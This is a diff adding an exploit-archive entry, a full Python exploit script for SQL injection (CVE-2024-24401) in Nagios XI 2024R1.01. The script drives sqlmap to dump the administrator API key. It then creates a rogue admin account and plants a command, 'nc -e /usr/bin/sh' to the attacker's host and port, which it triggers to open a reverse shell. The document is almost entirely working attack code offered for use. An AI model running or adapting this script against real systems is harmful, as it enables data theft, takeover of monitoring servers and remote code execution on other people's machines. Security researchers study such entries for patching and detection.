@@ -1,0 +1,190 @@
+id: 39485
+date: 03/27/2024
+title: Nagios XI Version 2024R1.01 - SQL Injection Exploit
+author: Jarod Jaslow
+cves: 
+
+# Exploit Title: NAGIOS XI SQLI
+# Exploit Author: Jarod Jaslow (MAWK) https://www.linkedin.com/in/jarod-jaslow-codename-mawk-265144201/
+# Vendor Homepage: https://www.nagios.com/changelog/#nagios-xi
+# Software Link: https://github.com/MAWK0235/CVE-2024-24401
+# Version: Nagios XI Version 2024R1.01
+# Tested on: Nagios XI Version 2024R1.01 LINUX
+# CVE : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-24401
+#
+
+import requests
+import subprocess
+import argparse
+import re
+import urllib3
+import os
+import random
+import string
+from colorama import Fore, Style
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+
+def serviceLogin(user,password):
+    r = requests.post(f'http://{IP}/nagiosxi/api/v1/authenticate?pretty=1',data={'username':user,'password':password,"valid_min":"5"},verify=False)  
+    print(f"{Fore.MAGENTA}[+] Authenticating with captured credtials to API....")
+    match = re.search(r'auth_token": "(.*)"',r.text)
+    if match:
+        token = match.group(1)
+        print(f'{Fore.MAGENTA}[+] Token: ' + token)
+        r = requests.get(f'http://{IP}/nagiosxi/login.php?token={token}', verify=False)
+        cookie = r.headers['Set-Cookie']
+        cookie = cookie.split(',')[0]
+        match = re.search(r'nagiosxi=(.*);', cookie)
+        cookie = match.group(1)
+        print(f"{Fore.MAGENTA}[+] Auth cookie is: " + cookie)
+        return cookie
+    else:
+        print(f'{Fore.RED}[-] Authentication Failed..{Style.RESET_ALL}')
+        exit()
+
+def sqlmap(IP,username,password):
+    
+    print(f'{Fore.MAGENTA}[+] Starting SQLMAP...')
+    session = requests.session()
+    s = session.get(f'http://{IP}/nagiosxi/index.php', verify=False)
+    match = re.search(r'var nsp_str = \"(.*?)\"', s.text)
+    nsp = match.group(1)
+    print(f"{Fore.MAGENTA}[+] NSP captured: " + nsp)
+    data = {"nsp": nsp, "page": "auth", "debug": '', "pageopt": "login", "username": username, "password": password, "loginButton": ''}
+    s = session.post(f'http://{IP}/nagiosxi/login.php', data=data)
+    print(f"{Fore.MAGENTA}[+] Authenticated as User..")
+    print(f"{Fore.MAGENTA}[+] Accepting license Agreement...")
+    s = session.get(f'http://{IP}/nagiosxi/login.php?showlicense', verify=False)
+    match = re.search(r'var nsp_str = \"(.*?)\"', s.text)
+    nsp = match.group(1)
+    data = {"page": "/nagiosxi/login.php", "pageopt": "agreelicense", "nsp": nsp, "agree_license": "on"}
+    session.post(f"http://{IP}/nagiosxi/login.php?showlicense", data=data)
+    print(f"{Fore.MAGENTA}[+] Performing mandatory password change ARGH")
+    newPass = "mawk"
+    data = {"page": "/nagiosxi/login.php", "pageopt": "changepass", "nsp": nsp,"current_password": password, "password1": newPass, "password2": newPass, "reporttimesubmitbutton": ''}
+    session.post(f"http://{IP}/nagiosxi/login.php?forcepasswordchange", data=data)
+    s= session.get(f'http://{IP}/nagiosxi/')
+    match = re.search(r'var nsp_str = \"(.*?)\"', s.text)
+    nsp = match.group(1)
+    cookie = s.cookies.get('nagiosxi')
+    sqlmap_command = f'sqlmap --flush-session -u "http://{IP}/nagiosxi//config/monitoringwizard.php/1*?update=1&nextstep=2&nsp={nsp}&wizard=mysqlserver" --cookie="nagiosxi={cookie}" --dump -D nagiosxi -T xi_users --drop-set-cookie --technique=ET --dbms=MySQL -p id --risk=3 --level=5 --threads=10 --batch'
+    #print(sqlmap_command)
+    sqlmap_command_output = subprocess.Popen(sqlmap_command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True )
+    try:
+        for line in iter(sqlmap_command_output.stdout.readline, ''):
+            if "| Nagios Administrator |" in line:
+                match = re.search(r"Nagios Administrator \| (.*?) \|", line)
+                if match:
+                    adminKey= match.group(1)
+                    print(f"{Fore.MAGENTA}[+] Admin Key recovered: " + adminKey)
+                    return adminKey
+                else:
+                    print(f"{Fore.RED}[-] Could not pull Admin Key :(....{Style.RESET_ALL}")
+                    exit()
+                break
+        print("[-] SQLMAP capture FAILED..")
+        sqlmap_command_output.terminate()
+
+    except KeyboardInterrupt:
+        print(f"{Fore.RED}[-] SQLMAP interrupted. Cleaning up...{Style.RESET_ALL}")
+        sqlmap_command_output.terminate()
+        sqlmap_command_output.communicate()
+        exit()
+
+def createAdmin(IP,adminKey):
+    characters = string.ascii_letters + string.digits
+    random_username = ''.join(random.choice(characters) for i in range(5))
+    random_password = ''.join(random.choice(characters) for i in range(5))
+
+    data = {"username": random_username, "password": random_password, "name": random_username, "email": f"{random_username}@mail.com", "auth_level": "admin"}
+    r = requests.post(f'http://{IP}/nagiosxi/api/v1/system/user?apikey={adminKey}&pretty=1', data=data, verify=False)
+    if "success" in r.text:
+        print(f'{Fore.MAGENTA}[+] Admin account created...')
+        return random_username, random_password
+    else:
+        print(f'{Fore.RED}[-] Account Creation Failed!!! :(...{Style.RESET_ALL}')
+        print(r.text)
+        exit()
+
+def start_HTTP_server():
+    subprocess.Popen(["python", "-m", "http.server", "8000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+def adminExploit(adminUsername, adminPassword, IP, LHOST,LPORT):
+    print(f"{Fore.MAGENTA}[+] Conducting mandatory password change...")
+    session = requests.session()
+    s = session.get(f'http://{IP}/nagiosxi/index.php', verify=False)
+    match = re.search(r'var nsp_str = \"(.*?)\"', s.text)
+    nsp = match.group(1)
+    print(f"{Fore.MAGENTA}[+] NSP captured: " + nsp)
+    data = {"nsp": nsp, "page": "auth", "debug": '', "pageopt": "login", "username": adminUsername, "password": adminPassword, "loginButton": ''}
+    s = session.post(f'http://{IP}/nagiosxi/login.php', data=data)
+    print(f"{Fore.MAGENTA}[+] Authenticated as admin..")
+    print(f"{Fore.MAGENTA}[+] Accepting license Agreement...")
+    s = session.get(f'http://{IP}/nagiosxi/login.php?showlicense', verify=False)
+    match = re.search(r'var nsp_str = \"(.*?)\"', s.text)
+    nsp = match.group(1)
+    data = {"page": "/nagiosxi/login.php", "pageopt": "agreelicense", "nsp": nsp, "agree_license": "on"}
+    session.post(f"http://{IP}/nagiosxi/login.php?showlicense", data=data)
+    print(f"{Fore.MAGENTA}[+] Performing mandatory password change ARGH")
+    newAdminPass = adminUsername + adminPassword
+    data = {"page": "/nagiosxi/login.php", "pageopt": "changepass","current_password": adminPassword, "nsp": nsp, "password1": newAdminPass, "password2": newAdminPass, "reporttimesubmitbutton": ''}
+    session.post(f"http://{IP}/nagiosxi/login.php?forcepasswordchange", data=data)
+    print(f"{Fore.MAGENTA}[+] Creating new command...")
+    data = {"tfName": adminUsername, "tfCommand": f"nc -e /usr/bin/sh {LHOST} {LPORT}", "selCommandType": "1", "chbActive": "1", "cmd": "submit", "mode": "insert", "hidId": "0", "hidName": '', "hidServiceDescription": '', "hostAddress": "127.0.0.1", "exactType": "command", "type": "command", "genericType": "command"}
+    session.post(f'http://{IP}/nagiosxi/includes/components/ccm/index.php?type=command&page=1', data=data)
+    data = {"cmd": '', "continue": ''}
+    start_HTTP_server()
+    print(f"{Fore.MAGENTA}[+] Created command: " + adminUsername)
+    session.post(f'http://{IP}/nagiosxi/includes/components/nagioscorecfg/applyconfig.php?cmd=confirm', data=data)
+    data = {"search": adminUsername}
+    s = session.post(f'http://{IP}/nagiosxi/includes/components/ccm/index.php?cmd=view&type=command&page=1', data=data)
+    match = re.search(r"javascript:actionPic\('deactivate','(.*?)','", s.text)
+    if match:
+        commandCID = match.group(1)
+        print(f"{Fore.MAGENTA}[+] Captured Command CID: " + commandCID)
+        s = session.get(f"http://{IP}/nagiosxi/includes/components/ccm/?cmd=view&type=service")
+        match = re.search(r'var nsp_str = \"(.*?)\"', s.text)
+        if match:
+            nsp = match.group(1)
+            s = session.get(f"http://{IP}/nagiosxi/includes/components/ccm/command_test.php?cmd=test&mode=test&cid={commandCID}&nsp={nsp}")
+            os.system("kill -9 $(lsof -t -i:8000)")
+            print(f"{Fore.RED}[+] CHECK UR LISTENER")
+        else:
+            print(f"{Fore.RED}[-] ERROR")
+    else:
+        print(f"{Fore.RED}[-] Failed to capture Command CID..{Style.RESET_ALL}")
+
+
+
+
+if __name__ == '__main__':
+    ascii_art = f"""{Fore.LIGHTRED_EX}
+███╗   ███╗ █████╗ ██╗    ██╗██╗  ██╗    ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗███████╗
+████╗ ████║██╔══██╗██║    ██║██║ ██╔╝    ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝██╔════╝
+██╔████╔██║███████║██║ █╗ ██║█████╔╝     ███████╗██║     ██████╔╝██║██████╔╝   ██║   ███████╗
+██║╚██╔╝██║██╔══██║██║███╗██║██╔═██╗     ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   ╚════██║
+██║ ╚═╝ ██║██║  ██║╚███╔███╔╝██║  ██╗    ███████║╚██████╗██║  ██║██║██║        ██║   ███████║
+╚═╝     ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   ╚══════╝
+     {Style.RESET_ALL}                                                                                      
+    """
+    print(ascii_art)
+    parser = argparse.ArgumentParser(description="AutoPwn Script for Bizness HTB machine", usage= "sudo Nagios.py <Target IP>  <LHOST> <LPORT>")
+    parser.add_argument('IP' ,help= "Target IP ")
+    parser.add_argument('LHOST',help= "Local host")
+    parser.add_argument('LPORT' ,help= "Listening Port")
+
+    args = parser.parse_args()
+    min_required_args = 3
+    if len(vars(args)) != min_required_args:
+        parser.print_usage()
+        exit()
+
+    adminUsername, adminPassword = createAdmin(args.IP, sqlmap(args.IP,input(f"{Fore.MAGENTA}[+] Please insert a non-administrative username: "),input(f"{Fore.MAGENTA}[+] Please insert the password: ")))
+    print(f"{Fore.MAGENTA}[+] Admin Username=" + adminUsername)
+    print(f"{Fore.MAGENTA}[+] Admin Password=" + adminPassword)
+    adminExploit(adminUsername, adminPassword, args.IP,args.LHOST,args.LPORT)
+
+#  0day.today [2024-03-28]  #
